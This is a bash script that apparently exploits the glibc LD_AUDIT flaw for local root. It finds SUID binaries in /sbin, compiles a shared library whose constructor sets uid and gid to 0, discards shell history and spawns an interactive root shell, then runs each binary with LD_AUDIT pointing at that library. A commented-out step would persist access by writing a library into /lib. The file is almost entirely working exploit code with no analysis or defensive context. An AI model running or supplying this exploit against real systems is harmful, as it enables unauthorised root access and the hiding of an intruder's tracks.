#!/bin/bash

binaries=();
filtered=(
	"/sbin/cdda2wav"
	"/sbin/cdrecord"
	"/sbin/chfn"
	"/sbin/chsh"
	"/sbin/chage"
);

mapfile -t binaries < <(find /sbin/* -perm -4000);

exploit=$(cat <<_EOF_
void __attribute__((constructor)) init() {
	unlink("/lib/gimmeroot.so");
	setuid(0);
	setgid(0);
	setenv("HISTFILE", "/dev/null", 1);
	execl("/bin/sh", "/bin/sh", "-i", 0);
}
_EOF_
);


is_filtered() {

	local binary="$1";
	local result="no";

	for other in "${filtered[@]}"; do

		if [[ "$other" == "$binary" ]]; then
			result="yes";
			break;
		fi;

	done;

	echo "$result";

}

prepare() {
	echo "$exploit" > /tmp/gimmeroot.c;
	gcc -w -fPIC -shared /tmp/gimmeroot.c -o /tmp/gimmeroot.so;
}



if [[ "${#binaries[@]}" != "0" ]]; then

	prepare;

	for binary in "${binaries[@]}"; do

		echo "\"$binary\"";
		echo "$(is_filtered $binary)";

		if [[ "$(is_filtered $binary)" == "no" ]]; then

			echo "Trying out $binary ...";

			export LD_AUDIT="/tmp/gimmeroot.so";
			$binary;

			# if [[ -f "/usr/lib/libpcprofile.so" ]]; then
			#	echo "Persisting access ...";
			# 	LD_AUDIT="libpcprofile.so" PCPROFILE_OUTPUT="/lib/gimmeroot.so" $binary;
			# fi;

		fi;

	done;

else

	echo "No SUID binaries found :(";
	exit 1;

fi;

